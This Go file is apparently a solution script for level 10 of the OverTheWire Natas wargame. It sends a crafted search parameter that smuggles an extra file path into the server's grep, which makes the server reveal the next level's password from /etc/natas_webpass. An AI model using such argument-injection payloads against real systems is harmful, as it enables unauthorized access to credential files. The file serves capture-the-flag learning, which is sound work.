package levels

import (
	"io"
	"log"
	"net/http"
	"regexp"
)

func GetLevel11Password(password string) string {
	var username string = "natas10"
	client := &http.Client{}

	req, err := http.NewRequest(http.MethodPost, "http://natas10.natas.labs.overthewire.org/?needle=a+/etc/natas_webpass/natas11&submit=Search", nil)
	if err != nil {
		log.Fatal(err)
	}

	req.SetBasicAuth(username, password)

	resp, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}

	bodyText, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}

	s := string(bodyText)
	re := regexp.MustCompile(`etc/natas_webpass/natas11:(.*)`)
	match := re.FindStringSubmatch(s)
	natas11Password := match[1]

	return natas11Password
}
